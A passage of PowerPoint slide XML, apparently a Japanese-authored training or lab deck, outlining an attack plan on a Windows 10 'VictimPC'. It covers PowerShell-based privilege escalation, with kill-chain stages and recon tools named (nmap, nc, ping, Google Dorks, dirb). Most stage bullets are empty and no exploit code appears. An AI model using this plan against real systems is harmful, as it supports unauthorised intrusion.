                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97994570-5827-40E1-8E3D-1C809DD45B31}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9221561" y="6524927"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">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正方形/長方形 13">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD9F8244-71D9-4198-9904-14600F67E93E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="9108620" y="5872388"/>
                <a:ext cx="889907" cy="545798"/>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16" name="テキスト ボックス 15">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DA7A626E-6384-42E6-9251-808D681D8E8D}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9192306" y="5976862"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>VictimPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="矢印: 上向き折線 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24E84BF4-CB74-48E5-A81A-56A712BF96C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="3665917" y="-530763"/>
            <a:ext cx="4431375" cy="10454528"/>
          </a:xfrm>
          <a:prstGeom prst="bentUpArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 11281"/>
              <a:gd name="adj2" fmla="val 10814"/>
              <a:gd name="adj3" fmla="val 35780"/>
            </a:avLst>
          </a:prstGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:lnRef>
          <a:fillRef idx="1">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent1">
              <a:tint val="50000"/>
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="lt1">
              <a:hueOff val="0"/>
              <a:satOff val="0"/>
              <a:lumOff val="0"/>
              <a:alphaOff val="0"/>
            </a:schemeClr>
          </a:fontRef>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="テキスト ボックス 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B2DB12C-4E99-452F-9BFE-063F94103C7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1468545" y="447412"/>
            <a:ext cx="9691685" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Approach2:Privilege escalation exploiting PowerShell vulnerabilities</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="グループ化 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10752D72-3091-4B56-9267-55205B06D228}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1623624" y="1533875"/>
            <a:ext cx="4686162" cy="646332"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="24" name="四角形: 角を丸くする 23">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{294B98B6-E090-4843-8525-656F7ED7D48B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491468" y="1520261"/>
              <a:ext cx="7780899" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="30" name="四角形: 角を丸くする 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B24F1EF-D430-42F2-B552-049B28001865}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2607801" y="1654106"/>
              <a:ext cx="1967592" cy="356263"/>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1100" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Reconnaissance</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="2" name="テキスト ボックス 1">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2DB347B2-3F3C-40C7-9914-B443049E01A5}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4619958" y="1543592"/>
              <a:ext cx="5412921" cy="523220"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Portscan,HOSTscan</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Website(URL, Layout)</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="17" name="グループ化 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E787FA3-C72F-4243-872B-1F8EB485D1E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1611564" y="3099560"/>
            <a:ext cx="4784299" cy="646332"/>
            <a:chOff x="2491467" y="2402584"/>
            <a:chExt cx="7943847" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="四角形: 角を丸くする 25">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6104BA1F-5E5C-4D19-BDF5-8CB7A3A724F0}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491467" y="2402584"/>
              <a:ext cx="7780901" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="5" name="グループ化 4">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D3A17D01-9D8D-468C-A143-12D4A7C06864}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671764" y="2520750"/>
              <a:ext cx="7763550" cy="444288"/>
              <a:chOff x="2671764" y="2520750"/>
              <a:chExt cx="7763550" cy="444288"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="31" name="四角形: 角を丸くする 30">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BD7D45A-C104-4B41-81DC-5F78001649AE}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671764" y="2520750"/>
                <a:ext cx="1967592" cy="444288"/>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1200" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Weaponization</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="27" name="テキスト ボックス 26">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{462A7246-78FD-462B-A575-9447FB11CF81}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4776110" y="2525905"/>
                <a:ext cx="5659204" cy="307777"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="グループ化 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{204AC1E6-E537-4172-A461-7ABD8230CC85}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="1581447"/>
            <a:ext cx="4735755" cy="751726"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7863244" cy="751726"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="四角形: 角を丸くする 33">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ADC5810C-268B-4B77-AFB9-377D7E31E1FA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2472065" y="3278783"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="35" name="四角形: 角を丸くする 34">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A027BF5-CF9E-4D80-9DB7-E6C22C87E656}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2627194" y="3383918"/>
              <a:ext cx="1967592" cy="444288"/>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400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Exploitation</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="テキスト ボックス 28">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3A607270-D263-4193-850D-B9016329C0C3}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4749915" y="3291845"/>
              <a:ext cx="5585394" cy="738664"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:br>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
              </a:br>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="テキスト ボックス 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67DC3C26-A69A-4D87-B44D-E707C0D4E273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11241317" y="5988824"/>
            <a:ext cx="584968" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="テキスト ボックス 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55732190-C9A7-4CFC-BA51-6E6A5EF8E2EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1708819" y="2201617"/>
            <a:ext cx="7460125" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1800" dirty="0" err="1"/>
              <a:t>Portscan:nmap,nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1800" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1800" dirty="0" err="1"/>
              <a:t>ipscan:ping,nmap,nc</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1800" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1800" dirty="0" err="1"/>
              <a:t>Website:Google</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1800" dirty="0" err="1"/>
              <a:t>Dorks,dirb</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="テキスト ボックス 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C705EF42-E8D0-488E-B0D4-DAD87043883E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1468545" y="116910"/>
            <a:ext cx="6873267" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>TARGET</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>Windows10</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="40" name="グループ化 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F5F1FA9-31DB-458E-B9E7-CDDE1613C0AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="4660745"/>
            <a:ext cx="5026053" cy="646332"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="41" name="四角形: 角を丸くする 40">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{330374DF-55CB-4607-AB91-EF703A5F6BBA}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2491462" y="4146186"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="42" name="グループ化 41">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5622D2E7-B74B-4299-802F-5B18CE535E4C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="2671758" y="4190002"/>
              <a:ext cx="8164958" cy="523220"/>
              <a:chOff x="2671758" y="4190002"/>
              <a:chExt cx="8164958" cy="523220"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="43" name="四角形: 角を丸くする 42">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F620D5B7-F779-425B-9769-B3388581BCA1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="2671758" y="4254740"/>
                <a:ext cx="1967592" cy="444288"/>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400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="tx1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>Privilege escalation</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="44" name="テキスト ボックス 43">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E453680-4964-452E-8D8E-32868BDFD542}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4731540" y="4190002"/>
                <a:ext cx="6105176" cy="523220"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="square" rtlCol="0">
                <a:spAutoFit/>
              </a:bodyPr>
              <a:lstStyle/>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:endParaRPr>
              </a:p>
              <a:p>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="50" name="グループ化 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA9BB01F-3B5A-4DCA-AE39-B3CF9EE2017C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6606116" y="3123210"/>
            <a:ext cx="5026053" cy="646332"/>
            <a:chOff x="2491462" y="4146186"/>
            <a:chExt cx="8345254" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
